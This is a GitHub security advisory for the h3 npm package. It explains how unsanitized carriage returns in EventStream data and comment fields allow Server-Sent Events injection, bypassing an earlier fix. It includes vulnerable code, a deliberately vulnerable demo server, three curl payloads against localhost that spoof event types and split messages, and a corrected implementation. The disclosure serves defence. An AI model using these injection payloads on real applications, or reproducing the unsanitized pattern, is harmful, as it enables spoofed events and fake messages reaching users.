# [M] h3: SSE Event Injection via Unsanitized Carriage Return (`\r`) in EventStream Data and Comment Fields (Bypass of CVE Fix)

## Summary
Severity: Medium
Advisory: GHSA-4hxc-9384-m385
CWE: CWE-74
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-4hxc-9384-m385
Type: github-advisory

## Affected
- npm: `h3` — affected >=2.0.0-beta.0 <2.0.1-rc.17
- npm: `h3` — affected >=0 <1.15.9

## Details
## Summary

The `EventStream` class in h3 fails to sanitize carriage return (`\r`) characters in `data` and `comment` fields. Per the SSE specification, `\r` is a valid line terminator, so browsers interpret injected `\r` as line breaks. This allows an attacker to inject arbitrary SSE events, spoof event types, and split a single `push()` call into multiple distinct browser-parsed events. This is an incomplete fix bypass of commit `7791538` which addressed `\n` injection but missed `\r`-only injection.

## Details

The prior fix in commit `7791538` added `_sanitizeSingleLine()` to strip `\n` and `\r` from `id` and `event` fields, and changed `data` formatting to split on `\n`. However, two code paths remain vulnerable:

### 1. `data` field — `formatEventStreamMessage()` (`src/utils/internal/event-stream.ts:190-193`)

```typescript
const data = typeof message.data === "string" ? message.data : "";
for (const line of data.split("\n")) {  // Only splits on \n, not \r
  result += `data: ${line}\n`;
}
```

`String.prototype.split("\n")` does **not** split on `\r`. A string like `"legit\revent: evil"` remains as a single "line" and is emitted as:

```
data: legit\revent: evil\n
```

Per the [SSE specification §9.2.6](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation), `\r` alone is a valid line terminator. The browser parses this as two separate lines:

```
data: legit
event: evil
```

### 2. `comment` field — `formatEventStreamComment()` (`src/utils/internal/event-stream.ts:170-177`)

```typescript
export function formatEventStreamComment(comment: string): string {
  return (
    comment
      .split("\n")  // Only splits on \n, not \r
      .map((l) => `: ${l}\n`)
      .join("") + "\n"
  );
}
```

The same `split("\n")` pattern means `\r` in comments is not handled. An input like `"x\rdata: injected"` produces:

```
: x\rdata: injected\n\n
```

Which the browser parses as a comment line followed by actual data:

```
: x
data: injected
```

### Why `_sanitizeSingleLine` doesn't help

The `_sanitizeSingleLine` function at line 198 correctly strips both `\r` and `\n`:

```typescript
function _sanitizeSingleLine(value: string): string {
  return value.replace(/[\n\r]/g, "");
}
```

But it is **only applied to `id` and `event` fields** (lines 182, 185), not to `data` or `comment`.

## PoC

### Setup

Create a minimal h3 application that reflects user input into an SSE stream:

```javascript
// server.mjs
import { createApp, createEventStream, defineEventHandler, getQuery } from "h3";

const app = createApp();

app.use("/sse", defineEventHandler(async (event) => {
  const stream = createEventStream(event);
  const { msg } = getQuery(event);

  // Simulates user-controlled input flowing to SSE (common in chat/AI apps)
  await stream.push(String(msg));

  setTimeout(() => stream.close(), 1000);
  return stream.send();
}));

export default app;
```

### Attack 1: Event type injection via `\r` in data

```bash
# Inject an "event: evil" directive via \r in data
curl -N --no-buffer "http://localhost:3000/sse?msg=legit%0Devent:%20evil"
```

**Expected (safe) wire output:**
```
data: legit\revent: evil\n\n
```

**Browser parses as:**
```
data: legit
event: evil
```

The browser's `EventSource` fires a custom `evil` event instead of the default `message` event, potentially routing data to unintended handlers.

### Attack 2: Message boundary injection (event splitting)

```bash
# Inject a message boundary (\r\r = empty line) to split one push() into two events
curl -N --no-buffer "http://localhost:3000/sse?msg=first%0D%0Ddata:%20injected"
```

**Browser parses as two separate events:**
1. Event 1: `data: first`
2. Event 2: `data: injected`

A single `push()` call produces two distinct events in the browser — the attacker controls the second event's content entirely.

### Attack 3: Comment escape to data injection

```bash
# Inject via pushComment() — escape from comment into data
curl -N --no-buffer "http://localhost:3000/sse-comment?comment=x%0Ddata:%20injected"
```

**Browser parses as:**
```
: x          (comment, ignored)
data: injected  (real data, dispatched as event)
```

## Impact

- **Event spoofing:** Attacker can inject arbitrary `event:` types, causing browsers to dispatch events to different `EventSource.addEventListener()` handlers than intended. In applications that use custom event types for control flow (e.g., `error`, `done`, `system`), this enables UI manipulation.
- **Message boundary injection:** A single `push()` call can be split into multiple browser-side events. This breaks application-level framing assumptions — e.g., a chat message could appear as two messages, or an injected "system" message could appear in an AI chat interface.
- **Comment-to-data escalation:** Data can be injected through what the application considers a harmless comment field via `pushComment()`.
- **Bypass of existing security control:** The prior fix (commit `7791538`) explicitly intended to prevent SSE injection, demonstrating the project considers this a security issue. The incomplete fix creates a false sense of security.

## Recommended Fix

Both `formatEventStreamMessage` and `formatEventStreamComment` should split on `\r`, `\n`, and `\r\n` — matching the SSE spec's line terminator definition.

```typescript
// src/utils/internal/event-stream.ts

// Add a shared regex for SSE line terminators
const SSE_LINE_SPLIT = /\r\n|\r|\n/;

export function formatEventStreamComment(comment: string): string {
  return (
    comment
      .split(SSE_LINE_SPLIT)  // was: .split("\n")
      .map((l) => `: ${l}\n`)
      .join("") + "\n"
  );
}

export function formatEventStreamMessage(message: EventStreamMessage): string {
  let result = "";
  if (message.id) {
    result += `id: ${_sanitizeSingleLine(message.id)}\n`;
  }
  if (message.event) {
    result += `event: ${_sanitizeSingleLine(message.event)}\n`;
  }
  if (typeof message.retry === "number" && Number.isInteger(message.retry)) {
    result += `retry: ${message.retry}\n`;
  }
  const data = typeof message.data === "string" ? message.data : "";
  for (const line of data.split(SSE_LINE_SPLIT)) {  // was: data.split("\n")
    result += `data: ${line}\n`;
  }
  result += "\n";
  return result;
}
```

This ensures all three SSE-spec line terminators (`\r\n`, `\r`, `\n`) are properly handled as line boundaries, preventing `\r` from being passed through to the browser where it would be interpreted as a line break.

## References
- https://github.com/h3js/h3/security/advisories/GHSA-4hxc-9384-m385
- https://github.com/h3js/h3
